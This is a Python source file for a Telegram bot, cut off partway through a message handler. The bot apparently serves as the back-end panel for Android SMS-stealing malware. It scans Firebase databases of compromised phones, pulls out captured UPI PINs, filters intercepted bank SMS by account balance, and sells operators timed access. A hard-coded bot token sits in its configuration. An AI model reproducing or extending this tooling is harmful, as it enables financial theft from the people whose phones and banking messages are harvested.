import os
import re
import json
import time
import asyncio
import logging
import sqlite3
from datetime import datetime, timedelta

import aiosqlite
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
)
from telegram.request import HTTPXRequest

# ══════════════════════════════════════════════════════
# ⚙️ CONFIGURATION
# ══════════════════════════════════════════════════════
BOT_TOKEN = "9207432550:AAHLuB2y4UHBx3n14eMUERY99S_vBr1nCc4"
OWNER_ID = 8866149676
OWNER_USERNAME = "@MR_GYANI_9"
CHANNEL_LINK = "https://t.me/MR_GYANI_0"

DATA_DIR = "./data"
os.makedirs(DATA_DIR, exist_ok=True)
DB_PATH = os.path.join(DATA_DIR, "users.db")

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════
# 🎯 GLOBAL STATE
# ══════════════════════════════════════════════════════
ACTIVE_TASKS = {}          # {user_id: asyncio.Task}
AUTH_CACHE = {}            # {user_id: (allowed: bool, ts: float, reason: str|None)}
AUTH_CACHE_TTL = 60        # seconds
USER_STATES = {}           # {user_id: state dict}

# ══════════════════════════════════════════════════════
# 🌐 SHARED HTTP SESSION
# ══════════════════════════════════════════════════════
_HTTP = None
_HTTP_LOCK = asyncio.Lock()

async def get_http() -> aiohttp.ClientSession:
    global _HTTP
    async with _HTTP_LOCK:
        if _HTTP is None or _HTTP.closed:
            conn = aiohttp.TCPConnector(
                limit=200,
                limit_per_host=20,
                ttl_dns_cache=300,
                force_close=False,
                enable_cleanup_closed=True
            )
            _HTTP = aiohttp.ClientSession(
                connector=conn,
                timeout=aiohttp.ClientTimeout(total=12, connect=5)
            )
        return _HTTP

async def close_http():
    global _HTTP
    if _HTTP and not _HTTP.closed:
        await _HTTP.close()
        _HTTP = None

# ══════════════════════════════════════════════════════
# 🚦 FIREBASE PER-URL RATE LIMITER
# ══════════════════════════════════════════════════════
FIREBASE_SEM = {}
FIREBASE_SEM_LOCK = asyncio.Lock()

async def get_fb_sem(url: str) -> asyncio.Semaphore:
    async with FIREBASE_SEM_LOCK:
        if url not in FIREBASE_SEM:
            FIREBASE_SEM[url] = asyncio.Semaphore(3)
        return FIREBASE_SEM[url]

# ══════════════════════════════════════════════════════
# 🗄️ DATABASE (aiosqlite + WAL)
# ══════════════════════════════════════════════════════
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("PRAGMA journal_mode=WAL")
        await db.execute("PRAGMA synchronous=NORMAL")
        await db.execute("PRAGMA busy_timeout=5000")
        await db.execute(
            '''CREATE TABLE IF NOT EXISTS users
               (user_id INTEGER PRIMARY KEY, name TEXT, username TEXT,
                expiry TEXT, banned INTEGER DEFAULT 0, verified INTEGER DEFAULT 0)'''
        )
        await db.commit()

        async with db.execute("PRAGMA table_info(users)") as cur:
            cols = {row[1] for row in await cur.fetchall()}

        if "username" not in cols:
            await db.execute("ALTER TABLE users ADD COLUMN username TEXT")
        if "verified" not in cols:
            await db.execute("ALTER TABLE users ADD COLUMN verified INTEGER DEFAULT 0")
        if "banned" not in cols:
            await db.execute("ALTER TABLE users ADD COLUMN banned INTEGER DEFAULT 0")
        await db.commit()

async def get_user(user_id: int):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            async with db.execute(
                "SELECT expiry, banned, verified FROM users WHERE user_id = ?",
                (user_id,)
            ) as cur:
                row = await cur.fetchone()
                if row:
                    return {
                        "expiry": row["expiry"],
                        "banned": bool(row["banned"]),
                        "verified": bool(row["verified"]),
                    }
        return None
    except Exception as e:
        logger.error(f"get_user failed uid={user_id}: {e}")
        return None

async def add_user(user_id: int, name: str, username: str):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT OR IGNORE INTO users (user_id, name, username, expiry, banned, verified) "
                "VALUES (?, ?, ?, NULL, 0, 0)",
                (user_id, name, username)
            )
            await db.commit()
    except Exception as e:
        logger.error(f"add_user failed uid={user_id}: {e}")

async def approve_user_db(user_id: int, days=None):
    try:
        expiry_str = "lifetime" if days is None else (
            datetime.now() + timedelta(days=days)
        ).strftime("%Y-%m-%d %H:%M:%S")
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "UPDATE users SET expiry = ?, banned = 0 WHERE user_id = ?",
                (expiry_str, user_id)
            )
            await db.commit()
        AUTH_CACHE.pop(user_id, None)
    except Exception as e:
        logger.error(f"approve_user_db failed uid={user_id}: {e}")

async def set_verified(user_id: int):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "UPDATE users SET verified = 1 WHERE user_id = ?", (user_id,)
            )
            await db.commit()
        AUTH_CACHE[user_id] = (True, time.time(), None)
    except Exception as e:
        logger.error(f"set_verified failed uid={user_id}: {e}")

async def ban_user_db(user_id: int):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "UPDATE users SET banned = 1, expiry = NULL WHERE user_id = ?",
                (user_id,)
            )
            await db.commit()
        AUTH_CACHE.pop(user_id, None)
    except Exception as e:
        logger.error(f"ban_user_db failed uid={user_id}: {e}")

async def get_stats():
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT COUNT(*) FROM users") as cur:
                total = (await cur.fetchone())[0]
            async with db.execute("SELECT COUNT(*) FROM users WHERE banned = 1") as cur:
                banned = (await cur.fetchone())[0]
            async with db.execute(
                "SELECT expiry FROM users WHERE expiry IS NOT NULL AND expiry != 'lifetime'"
            ) as cur:
                rows = await cur.fetchall()
            active = 0
            now = datetime.now()
            for (exp,) in rows:
                try:
                    if datetime.strptime(exp, "%Y-%m-%d %H:%M:%S") > now:
                        active += 1
                except Exception:
                    pass
            return total, active, banned
    except Exception as e:
        logger.error(f"get_stats failed: {e}")
        return 0, 0, 0

async def get_all_users(limit=30):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute(
                "SELECT user_id, name, expiry, banned FROM users LIMIT ?", (limit,)
            ) as cur:
                return await cur.fetchall()
    except Exception as e:
        logger.error(f"get_all_users failed: {e}")
        return []

async def get_all_user_ids():
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT user_id FROM users") as cur:
                return [r[0] for r in await cur.fetchall()]
    except Exception as e:
        logger.error(f"get_all_user_ids failed: {e}")
        return []

# ══════════════════════════════════════════════════════
# 🧠 PER-USER STATE
# ══════════════════════════════════════════════════════
def get_user_state(user_id):
    if user_id not in USER_STATES:
        USER_STATES[user_id] = {
            "firebases": {},
            "device_state": {},
            "scan_active": False,
            "search_active": False,
            "upi_active": False,
            "kill_switch": asyncio.Event(),
            "filter_min": 0.0,
            "filter_max": 0.0,
            "last_active": time.time(),
        }
    else:
        USER_STATES[user_id]["last_active"] = time.time()
    return USER_STATES[user_id]

async def _cancel_user_tasks(user_id: int):
    """Safely cancel user tasks — kill_switch SET first, then replace"""
    task = ACTIVE_TASKS.pop(user_id, None)
    st = USER_STATES.get(user_id) or get_user_state(user_id)

    st["kill_switch"].set()
    st["scan_active"] = False
    st["search_active"] = False
    st["upi_active"] = False

    if task and not task.done():
        task.cancel()
        try:
            await asyncio.wait_for(task, timeout=3)
        except (asyncio.CancelledError, asyncio.TimeoutError):
            pass
        except Exception as e:
            logger.warning(f"cancel warn user={user_id}: {e}")

    st["kill_switch"] = asyncio.Event()
    return st

async def cleanup_loop():
    """Memory leak fix — periodic cleanup"""
    while True:
        try:
            await asyncio.sleep(300)
            now = time.time()
            dead = []
            for uid, st in list(USER_STATES.items()):
                idle = now - st.get("last_active", now)
                if idle > 1800 and not st.get("scan_active") and \
                        not st.get("search_active") and not st.get("upi_active"):
                    dead.append(uid)
            for uid in dead:
                await _cancel_user_tasks(uid)
                USER_STATES.pop(uid, None)
            for uid, (_, ts, _) in list(AUTH_CACHE.items()):
                if now - ts > 300:
                    AUTH_CACHE.pop(uid, None)
            if dead:
                logger.info(f"cleanup: removed {len(dead)} idle user states")
        except asyncio.CancelledError:
            return
        except Exception as e:
            logger.error(f"cleanup_loop error: {e}")

# ══════════════════════════════════════════════════════
# 🔐 AUTH GUARD
# ══════════════════════════════════════════════════════
async def check_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> bool:
    uid = update.effective_user.id
    if uid == OWNER_ID:
        return True

    cached = AUTH_CACHE.get(uid)
    if cached and (time.time() - cached[1]) < AUTH_CACHE_TTL:
        allowed, _, reason = cached
        if not allowed and reason:
            await update.effective_message.reply_text(reason, parse_mode="HTML")
        return allowed

    user = await get_user(uid)

    if not user:
        msg = (
            f"⛔ <b>ACCESS DENIED</b>\n\n"
            f"Send /start to register.\n"
            f"Your ID: <code>{uid}</code>\n"
            f"Owner: {OWNER_USERNAME}"
        )
        AUTH_CACHE[uid] = (False, time.time(), msg)
        await update.effective_message.reply_text(msg, parse_mode="HTML")
        return False

    if user.get("banned"):
        msg = (
            f"🚫 <b>YOU ARE BANNED!</b>\n\n"
            f"<i>Contact owner to unban: {OWNER_USERNAME}</i>"
        )
        AUTH_CACHE[uid] = (False, time.time(), msg)
        await update.effective_message.reply_text(msg, parse_mode="HTML")
        return False

    expiry = user.get("expiry")
    if not expiry:
        msg = f"⛔ <b>NO ACCESS!</b>\n\nContact owner: {OWNER_USERNAME}"
        AUTH_CACHE[uid] = (False, time.time(), msg)
        await update.effective_message.reply_text(msg, parse_mode="HTML")
        return False

    if expiry != "lifetime":
        try:
            if datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S") < datetime.now():
                msg = f"⏳ <b>ACCESS EXPIRED!</b>\n\nRenew with owner: {OWNER_USERNAME}"
                AUTH_CACHE[uid] = (False, time.time(), msg)
                await update.effective_message.reply_text(msg, parse_mode="HTML")
                return False
        except Exception:
            pass

    if not user.get("verified"):
        join_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📢 JOIN CHANNEL", url=CHANNEL_LINK)],
            [InlineKeyboardButton(text="✅ VERIFY MEMBERSHIP", callback_data="btn_verify_join")]
        ])
        msg = "⚠️ <b>CHANNEL VERIFICATION REQUIRED</b>\n\nJoin channel then click Verify."
        AUTH_CACHE[uid] = (False, time.time(), msg)
        await update.effective_message.reply_text(
            msg, reply_markup=join_kb, parse_mode="HTML"
        )
        return False

    AUTH_CACHE[uid] = (True, time.time(), None)
    return True

# ══════════════════════════════════════════════════════
# 🚫 PARSERS & FILTERS
# ══════════════════════════════════════════════════════
MUST_HAVE_BANK_WORDS = re.compile(
    r'(avl\s*bal|available\s*bal|credited|debited|withdrawn|deposited|'
    r'a/?c\s*(no|num|ending|\*)|account\s*ending|'
    r'txn|transaction|upi|imps|neft|'
    r'balance\s*(is|:)|card\s*(no|ending|\*))', re.IGNORECASE)

BLACKLIST_WORDS = re.compile(
    r'(do not copy|forward or share|welcome back|porting|best network|'
    r'recharge|quota|validity|data\s*usage|pack\s*valid|sms\s*cost|'
    r'gb/day|unlimited|benefits|thank you for choosing|'
    r'airtel\s*mobile|jio\s*number|vi\s*number|team\s*jio|team\s*airtel|'
    r'ppx|ppxUhp|track|survey|offer|free)', re.IGNORECASE)

def is_bank_sms(text: str) -> bool:
    if not text or len(text) < 20:
        return False
    if BLACKLIST_WORDS.search(text):
        return False
    if MUST_HAVE_BANK_WORDS.search(text) and re.search(r'\d', text):
        if "otp" in text.lower() and "bal" not in text.lower() and "debited" not in text.lower():
            return False
        return True
    return False

def extract_balance_float(text: str) -> float:
    patterns = [
        r'(?:avl|available)\s*(?:bal|balance)?\s*[:=]?\s*(?:rs\.?|inr|₹)?\s*([\d,]+(?:\.\d{1,2})?)',
        r'(?:balance|bal)\s*(?:is|:|=)?\s*(?:rs\.?|inr|₹)?\s*([\d,]+(?:\.\d{1,2})?)'
    ]
    for pat in patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            try:
                return float(m.group(1).replace(",", ""))
            except Exception:
                pass
    return -1.0

def extract_amount_float(text: str) -> float:
    t = (text.replace("Avl Bal", "XXX")
             .replace("available balance", "XXX")
             .replace("Balance", "XXX"))
    m = re.search(r'(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)', t, re.IGNORECASE)
    if m:
        try:
            return float(m.group(1).replace(",", ""))
        except Exception:
            pass
    return -1.0

def parse_sms_date(ts_str: str) -> datetime:
    if not ts_str:
        return datetime.now()
    s = str(ts_str).strip()
    if s.isdigit() and len(s) >= 13:
        try:
            return datetime.fromtimestamp(int(s) / 1000.0)
        except Exception:
            pass
    if s.isdigit() and len(s) == 10:
        try:
            return datetime.fromtimestamp(int(s))
        except Exception:
            pass
    for fmt in ["%d-%m-%Y %H:%M:%S", "%d-%m-%Y %H:%M", "%d-%m-%Y",
                "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%Y-%m-%d"]:
        try:
            dt = datetime.strptime(s, fmt)
            if dt.year < 2000:
                dt = dt.replace(year=dt.year + 2000)
            return dt
        except Exception:
            pass
    return datetime.now()

def is_recent(ts_str: str, days=30) -> bool:
    try:
        dt = parse_sms_date(ts_str)
        now = datetime.now()
        return (now - timedelta(days=days)) <= dt <= (now + timedelta(hours=1))
    except Exception:
        return True

# ══════════════════════════════════════════════════════
# FIREBASE HELPERS
# ══════════════════════════════════════════════════════
async def fb_get(url: str, path: str, timeout=6, retries=2):
    for attempt in range(retries + 1):
        sem = await get_fb_sem(url)
        was_429 = False
        async with sem:
            try:
                session = await get_http()
                async with session.get(
                    f"{url}/{path}.json",
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as r:
                    if r.status == 200:
                        txt = await r.text()
                        if txt and txt != "null":
                            return json.loads(txt)
                        return None
                    was_429 = (r.status == 429)
            except asyncio.CancelledError:
                raise
            except asyncio.TimeoutError:
                pass
            except Exception as e:
                logger.debug(f"fb_get fail {url}/{path}: {e}")
        if was_429 and attempt < retries:
            wait = min(2 ** attempt, 8)
            logger.warning(f"429 on {url} — waiting {wait}s")
            await asyncio.sleep(wait)
    return None

async def validate_firebase(url: str) -> bool:
    for target in [f"{url}/clients.json", f"{url}/.json"]:
        try:
            session = await get_http()
            async with session.get(target, timeout=aiohttp.ClientTimeout(total=5)) as r:
                if r.status == 200:
                    return True
        except Exception:
            pass
    return False

def parse_devices(data) -> list:
    """SIRF ONLINE devices return karta hai (status == True)"""
    devs = []
    if not data or not isinstance(data, dict):
        return devs
    for dev_id, d in data.items():
        if not isinstance(d, dict):
            continue
        # ✅ SIRF ONLINE — offline skip
        if not d.get("status"):
            continue

        raw_pin = d.get("upipin", "")
        pin_str = ""
        if isinstance(raw_pin, str):
            pin_str = raw_pin.strip()
        elif isinstance(raw_pin, (int, float)):
            pin_str = str(raw_pin)
        elif isinstance(raw_pin, dict):
            pin_str = str(raw_pin.get("pin") or raw_pin.get("value") or "")
        elif isinstance(raw_pin, list):
            pin_str = str(raw_pin[0]) if raw_pin else ""

        if pin_str.lower() in ("", "null", "none", "false", "0"):
            pin_str = ""

        sims = d.get("sims") or []
        if isinstance(sims, dict):
            sims = list(sims.values())
        devs.append({
            "id": dev_id,
            "model": d.get("modelName") or dev_id,
            "battery": d.get("battery", "?"),
            "mobNo": d.get("mobNo", ""),
            "sims": sims,
            "upipin": pin_str,
        })
    return devs

def parse_msgs(data) -> list:
    msgs = []
    if not data:
        return msgs
    items = data if isinstance(data, list) else (
        list(data.values()) if isinstance(data, dict) else []
    )
    for m in items:
        if isinstance(m, dict):
            txt = m.get("message") or m.get("body") or m.get("text") or ""
            sender = m.get("sender") or m.get("from") or ""
            ts = str(m.get("timestamp") or m.get("date") or "")
            if txt:
                try:
                    ts_val = parse_sms_date(ts).timestamp()
                except Exception:
                    ts_val = 0.0
                msgs.append({
                    "message": txt,
                    "sender": sender,
                    "timestamp": ts,
                    "_ts": ts_val,
                })
    msgs.sort(key=lambda x: x["_ts"], reverse=True)
    return msgs

# ══════════════════════════════════════════════════════
# 🎨 CARDS
# ══════════════════════════════════════════════════════
def format_deep_scan_card(fb_label: str, dev: dict, bank_msgs: list) -> str:
    pin = dev.get("upipin", "").split("|")[0].strip()
    carrier = dev["sims"][0].get("carrierName") if dev["sims"] else "—"
    mob = dev['mobNo'] if dev['mobNo'] else "Not Available"

    lines = [
        f"📁 <b>DATABASE:</b> <code>{fb_label}</code>",
        f"🆔 <b>DEVICE ID:</b> <code>{dev['id']}</code>",
        f"📱 <b>MOBILE:</b> {mob} ({carrier})",
        f"📲 <b>MODEL:</b> {dev['model']}",
        f"🔋 <b>BATTERY:</b> {dev['battery']}%",
    ]
    if pin:
        lines.append(f"🔐 <b>UPI PIN:</b> <code>{pin}</code>")

    lines.append("\n🏦 <b>BANK TRANSACTIONS:</b>")
    lines.append("━━━━━━━━━━━━━━━━━━━━")

    for i, sms in enumerate(bank_msgs, 1):
        txt = sms['message']
        bal = extract_balance_float(txt)
        amt = extract_amount_float(txt)

        if "debit" in txt.lower():
            txn_type = "🔴 <b>DEBITED</b>"
        elif "credit" in txt.lower():
            txn_type = "🟢 <b>CREDITED</b>"
        else:
            txn_type = "💳 <b>TRANSACTION</b>"

        lines.append(f"<b>{i}. {txn_type}</b>")
        if amt >= 0:
            lines.append(f"   💰 <b>Amount:</b> ₹{amt:g}")
        if bal >= 0:
            lines.append(f"   💵 <b>Balance:</b> ₹{bal:g}")
        lines.append(f"   📩 <b>Source:</b> {sms['sender']}")
        lines.append(f"   📄 <i>{txt[:120]}...</i>")
        lines.append("────────────────────")
    return "\n".join(lines)

def format_upi_card(fb_label: str, dev: dict) -> str:
    pin = dev.get("upipin", "").split("|")[0].strip()
    carrier = dev["sims"][0].get("carrierName") if dev["sims"] else "—"
    mob = dev['mobNo'] if dev['mobNo'] else "Not Available"
    return (
        f"🔐 <b>UPI PIN DETECTED</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📁 <b>DATABASE:</b> <code>{fb_label}</code>\n"
        f"🆔 <b>DEVICE ID:</b> <code>{dev['id']}</code>\n"
        f"📱 <b>MOBILE:</b> {mob} ({carrier})\n"
        f"📲 <b>MODEL:</b> {dev['model']}\n"
        f"🔋 <b>BATTERY:</b> {dev['battery']}%\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 <b>PIN:</b> <code>{pin}</code>\n"
        f"📄 <b>RAW:</b> <i>{dev.get('upipin')}</i>"
    )

# ══════════════════════════════════════════════════════
# 🎛 MENUS
# ══════════════════════════════════════════════════════
def get_main_menu(user_id):
    keyboard = [
        [KeyboardButton("⚡ START SCAN"), KeyboardButton("🛑 STOP SCAN")],
        [KeyboardButton("⚙️ SET FILTER"), KeyboardButton("🫆 UPI PIN SCAN")],
        [KeyboardButton("🔍 CUSTOM SEARCH"), KeyboardButton("🗑 CLEAR ALL")],
        [KeyboardButton("📁 SEND TXT FILE"), KeyboardButton("🔗 PASTE URL")]
    ]
    if user_id == OWNER_ID:
        keyboard.append([KeyboardButton("👑 ADMIN PANEL")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, is_persistent=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("📊 STATS"), KeyboardButton("👥 ALL USERS")],
        [KeyboardButton("➕ GIVE ACCESS"), KeyboardButton("🚫 REMOVE ACCESS")],
        [KeyboardButton("📢 BROADCAST")],
        [KeyboardButton("🔙 BACK TO PANEL")]
    ], resize_keyboard=True)

def get_days_kb(target_id, admin_mode=False):
    prefix = "admin_set" if admin_mode else "approve_set"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📅 1 DAY", callback_data=f"{prefix}_1_{target_id}"),
         InlineKeyboardButton(text="📅 7 DAYS", callback_data=f"{prefix}_7_{target_id}")],
        [InlineKeyboardButton(text="📅 30 DAYS", callback_data=f"{prefix}_30_{target_id}"),
         InlineKeyboardButton(text="♾️ LIFETIME", callback_data=f"{prefix}_life_{target_id}")],
        [InlineKeyboardButton(text="🔙 CANCEL", callback_data="admin_back_dashboard")]
    ])

# ══════════════════════════════════════════════════════
# 🚀 /start
# ══════════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    name = update.effective_user.first_name
    username = update.effective_user.username

    if user_id == OWNER_ID:
        welcome_text = (
            f"👋 <b>WELCOME OWNER, {name.upper()}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔒 <b>Status:</b> Owner\n"
            f"⏳ <b>Validity:</b> ♾️ Lifetime\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💡 <i>Use the menu below.</i>"
        )
        return await update.message.reply_text(
            welcome_text, reply_markup=get_main_menu(user_id), parse_mode="HTML"
        )

    user = await get_user(user_id)

    if not user:
        await add_user(user_id, name, username)
        try:
            profile_link = f"tg://user?id={user_id}"
            notify_text = (
                f"🚨 <b>NEW USER DETECTED!</b>\n\n"
                f"👤 <b>Name:</b> {name}\n"
                f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
                f"🔗 <b>Username:</b> @{username if username else 'None'}\n\n"
                f"👇 <i>Click below to approve:</i>"
            )
            notify_kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="👤 VIEW PROFILE", url=profile_link)],
                [InlineKeyboardButton(text="✅ APPROVE USER", callback_data=f"notify_approve_{user_id}")],
                [InlineKeyboardButton(text="🚫 REJECT/BAN", callback_data=f"notify_reject_{user_id}")]
            ])
            await ctx.bot.send_message(
                chat_id=OWNER_ID, text=notify_text,
                reply_markup=notify_kb, parse_mode="HTML"
            )
        except Exception as e:
            logger.warning(f"owner notify fail: {e}")

        return await update.message.reply_text(
            f"⛔ <b>ACCESS DENIED!</b>\n\n"
            f"<b>You are not authorized to use this bot.</b>\n\n"
            f"Your Telegram User ID: <code>{user_id}</code>\n"
            f"<i>Send this ID to the bot owner for access.</i>\n\n"
            f"👑 <b>Owner :</b> {OWNER_USERNAME}",
            parse_mode="HTML"
        )

    if not await check_auth(update, ctx):
        return

    welcome_text = (
        f"👋 <b>WELCOME, {name.upper()}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔒 <b>Account Status:</b> Active\n"
        f"⏳ <b>Validity:</b> {user.get('expiry')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💡 <i>Use the fixed menu below to control the bot.</i>"
    )
    await update.message.reply_text(
        welcome_text, reply_markup=get_main_menu(user_id), parse_mode="HTML"
    )

# ══════════════════════════════════════════════════════
# 🎛 CALLBACK HANDLER
# ══════════════════════════════════════════════════════
async def handle_inline_buttons(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    action = query.data

    if action == "btn_verify_join":
        await set_verified(user_id)
        await query.answer("✅ Verified Successfully!", show_alert=False)
        try:
            await query.message.delete()
        except Exception:
            pass

        name = query.from_user.first_name
        user = await get_user(user_id)
        expiry = "lifetime" if user_id == OWNER_ID else (
            user.get("expiry") if user else "None"
        )
        welcome_text = (
            f"👋 <b>WELCOME, {name.upper()}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔒 <b>Account Status:</b> Active\n"
            f"⏳ <b>Validity:</b> {expiry}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💡 <i>Use the fixed menu below to control the bot.</i>"
        )
        await query.message.reply_text(
            welcome_text, reply_markup=get_main_menu(user_id), parse_mode="HTML"
        )
        return

    await query.answer()

    if action.startswith("notify_") and user_id == OWNER_ID:
        parts = action.split("_")
        sub_action = parts[1]
        target_id = int(parts[2])

        if sub_action == "approve":
            await query.message.edit_text(
                f"👤 <b>User <code>{target_id}</code> found.</b>\n\n"
                f"⏳ <b>Select Access Duration:</b>",
                reply_markup=get_days_kb(target_id, admin_mode=False),
                parse_mode="HTML"
            )
        elif sub_action == "reject":
            await ban_user_db(target_id)
            await _cancel_user_tasks(target_id)
            await query.message.edit_text(
                f"🚫 <b>USER REJECTED!</b>\n\nUser: <code>{target_id}</code> has been banned.",
                parse_mode="HTML"
            )

    elif action.startswith("admin_set_") and user_id == OWNER_ID:
        parts = action.split("_")
        sub_action = parts[2]
        target_id = int(parts[3])
        days = None if sub_action == "life" else int(sub_action)
        await approve_user_db(target_id, days)
        exp_text = "♾️ Lifetime" if days is None else f"{days} Days"
        await query.message.edit_text(
            f"✅ <b>ACCESS GRANTED!</b>\n\n👤 User: <code>{target_id}</code>\n⏳ Expiry: {exp_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(text="🔙 Back to Panel", callback_data="admin_back_dashboard")
            ]]),
            parse_mode="HTML"
        )

    elif action.startswith("approve_set_") and user_id == OWNER_ID:
        parts = action.split("_")
        sub_action = parts[2]
        target_id = int(parts[3])
        days = None if sub_action == "life" else int(sub_action)
        await approve_user_db(target_id, days)
        exp_text = "♾️ Lifetime" if days is None else f"{days} Days"
        await query.message.edit_text(
            f"✅ <b>ACCESS GRANTED!</b>\n\n👤 User: <code>{target_id}</code>\n⏳ Expiry: {exp_text}",
            parse_mode="HTML"
        )
        try:
            await ctx.bot.send_message(
                chat_id=target_id,
                text=f"✅ <b>Your access has been approved!</b>\nDuration: {exp_text}\nSend /start to begin.",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.warning(f"approve notify fail uid={target_id}: {e}")

    elif action == "admin_back_dashboard":
        await query.message.edit_text(
            "👑 <b>ADMIN CONTROL PANEL</b>",
            reply_markup=get_admin_keyboard(),
            parse_mode="HTML"
        )

# ══════════════════════════════════════════════════════
# 📝 TEXT HANDLER
# ══════════════════════════════════════════════════════
async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if not await check_auth(update, ctx):
        return

    state = get_user_state(user_id)

    # --- FIXED KEYBOARD BUTTONS ---
    if text == "⚡ START SCAN":
        await _cancel_user_tasks(user_id)
        state = get_user_state(user_id)
        state["scan_active"] = True
        task = asyncio.create_task(background_scanner(ctx.bot, user_id, state))
        ACTIVE_TASKS[user_id] = task
        task.add_done_callback(
            lambda t, uid=user_id: ACTIVE_TASKS.pop(uid, None)
            if ACTIVE_TASKS.get(uid) == t else None
        )
        return await update.message.reply_text(
            f"⚡ <b>SCANNER STARTED</b>\n"
            f"Filter: ₹{state['filter_min']} to "
            f"₹{state['filter_max'] if state['filter_max'] > 0 else '∞'}",
            parse_mode="HTML"
        )

    elif text == "🛑 STOP SCAN":
        await _cancel_user_tasks(user_id)
        return await update.message.reply_text(
            "🛑 <b>ALL PROCESSES STOPPED</b>", parse_mode="HTML"
        )

    elif text == "⚙️ SET FILTER":
        await update.message.reply_text(
            "⚙️ <b>ENTER MIN & MAX AMOUNT</b>\n\nExample: <code>100 5000</code>",
            parse_mode="HTML"
        )
        ctx.user_data["awaiting_filter"] = True
        return

    elif text == "🫆 UPI PIN SCAN":
        await _cancel_user_tasks(user_id)
        state = get_user_state(user_id)
        state["upi_active"] = True
        task = asyncio.create_task(scan_upi_pins(ctx.bot, user_id, state))
        ACTIVE_TASKS[user_id] = task
        task.add_done_callback(
            lambda t, uid=user_id: ACTIVE_TASKS.pop(uid, None)
            if ACTIVE_TASKS.get(uid) == t else None
        )
        await update.message.reply_text(
            "🫆 <b>REALTIME UPI PIN SCAN STARTED...</b>", parse_mode="HTML"
        )
        return

    elif text == "🔍 CUSTOM SEARCH":
        await update.message.reply_text(
            "🔍 <b>TYPE THE KEYWORD TO SEARCH:</b>", parse_mode="HTML"
        )
        ctx.user_data["awaiting_search"] = True
        return

    elif text == "🗑 CLEAR ALL":
        await _cancel_user_tasks(user_id)
        state = get_user_state(user_id)
        state["firebases"].clear()
        state["device_state"].clear()
        return await update.message.reply_text(
            "🗑 <b>DATA CLEARED SUCCESSFULLY</b>", parse_mode="HTML"
        )

    elif text == "🔗 PASTE URL":
        return await update.message.reply_text(
            "🔗 <b>PASTE YOUR FIREBASE URL:</b>\n\n<i>Send the URL as a message.</i>",
            parse_mode="HTML"
        )

    elif text == "📁 SEND TXT FILE":
        return await update.message.reply_text(
            "📁 <b>SEND YOUR .TXT FILE NOW:</b>\n\n<i>Upload a .txt file containing Firebase URLs.</i>",
            parse_mode="HTML"
        )

    # --- ADMIN FIXED BUTTONS ---
    if user_id == OWNER_ID:
        if text == "👑 ADMIN PANEL":
            return await update.message.reply_text(
                "👑 <b>ADMIN CONTROL PANEL</b>",
                reply_markup=get_admin_keyboard(), parse_mode="HTML"
            )

        elif text == "🔙 BACK TO PANEL":
            return await update.message.reply_text(
                "🎛 <b>USER CONTROL PANEL</b>",
                reply_markup=get_main_menu(user_id), parse_mode="HTML"
            )

        elif text == "📊 STATS":
            total, active, banned = await get_stats()
            return await update.message.reply_text(
                f"📊 <b>BOT STATISTICS</b>\n\n"
                f"👥 Total Users: <b>{total}</b>\n"
                f"🟢 Active: <b>{active}</b>\n"
                f"🚫 Banned: <b>{banned}</b>",
                parse_mode="HTML"
            )

        elif text == "👥 ALL USERS":
            users = await get_all_users(30)
            if not users:
                return await update.message.reply_text("❌ No users found!", parse_mode="HTML")
            res_text = "👥 <b>RECENT 30 USERS</b>\n\n"
            for u in users:
                uid, name, exp, ban = u
                exp = exp if exp else "None"
                st = "🚫" if ban else "✅"
                res_text += f"{st} <a href='tg://user?id={uid}'>{name}</a> (<code>{uid}</code>) | Exp: {exp}\n"
            return await update.message.reply_text(res_text, parse_mode="HTML")

        elif text == "➕ GIVE ACCESS":
            await update.message.reply_text(
